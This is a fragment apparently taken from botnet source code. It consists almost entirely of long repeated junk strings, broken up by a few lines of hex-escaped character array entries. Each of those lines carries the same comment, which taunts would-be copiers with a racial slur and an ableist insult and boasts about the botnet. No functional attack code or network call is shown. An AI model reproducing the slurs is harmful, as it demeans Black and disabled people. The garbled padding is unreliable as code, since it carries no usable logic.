9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UG
    "\x49","\x4a","\x4b","\x4c","\x4d","\x4e","\x4f",//random sting decision//GET THE FOCK OUTA HERE SKID RETARD ASS NIGGER MY BOTYNET SOURCE IS TO GODLY GFIUOEFASHF98UHES9UGHRS97BUP0\GHFDBVU97PHBVGUI9PHRWIPUBVHRSIOUPGBHIOPUSFDNHBVIUJFDSNBHVIUSRipuyvbriswpunbvihsrbviuybsriubviursbviubriuvbisrbvirswbvirwsbviyubrwiyvbwrivbirwbvirwbiuribirwbiwrsiurwiurnupiosbGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UG
    "\x50","\x51","\x52","\x53","\x54","\x55","\x56",//random sting decision//GET THE FOCK OUTA HERE SKID RETARD ASS NIGGER MY BOTYNET SOURCE IS TO GODLY GFIUOEFASHF98UHES9UGHRS97BGPHBVGUI9PHRWIPUBVHRSIOUPGBHIOPUSFDNHBVIUJFDSNBHVIUSRipuyvbriswpunbvihsrbviuybsriubviursbviubriuvbisrbvirswbvirwsbviyubrwiyvbwrivbirwbvirwbiuribirwbiwrsiurwiurnupiosbGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UG
    "\x57","\x58","\x59","\x5a","\x5b","\x5c","\x5d",//random sting decision//GET THE FOCK OUTA HERE SKID RETARD ASS NIGGER MY BOTYNET SOURCE IS TO GODLY GFIUOEFASHF98UHES9UGHRS97BGPHBVGUI9PHRWIPUBVHRSIOUPGBHIOPUSFDNHBVIUJFDSNBHVIUSRipuyvbriswpunbvihsrbviuybsriubviursbviubriuvbisrbvirswbvirwsbviyubrwiyvbwrivbirwbvirwbiuribirwbiwrsiurwiurnupiosbGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UG
    "\x5e","\x5f","\x60","\x61","\x62","\x63","\x64",//random sting decision//GET THE FOCK OUTA HERE SKID RETARD ASS NIGGER MY BOTYNET SOURCE IS TO GODLY GFIUOEFASHF98UHES9UGHRS97BGPHBVGUI9PHRWIPUBVHRSIOUPGBHIOPUSFDNHBVIUJFDSNBHVIUSRipuyvbriswpunbvihsrbviuybsriubviursbviubriuvbisrbvirswbvirwsbviyubrwiyvbwrivbirwbvirwbiuribirwbiwrsiurwiurnupiosbGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UG
    "\x65","\x66","\x67","\x68","\x69","\x6a","\x6b",//random sting decision//GET THE FOCK OUTA HERE SKID RETARD ASS NIGGER MY BOTYNET SOURCE IS TO GODLY GFIUOEFASHF98UHES9UGHRS97BGHFDBVU97PHBVGUI9PHRWIPUBVHRSIOUPGBHIOPUSFDNHBVIUJFDSNBHVIUSRipuyvbriswpunbvihsrbviuybsriubviursbviubriuvbisrbvirswbvirwsbviyubrwiyvbwrivbirwbvirwbiuribirwbiwrsiurwiurnupiosbGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9U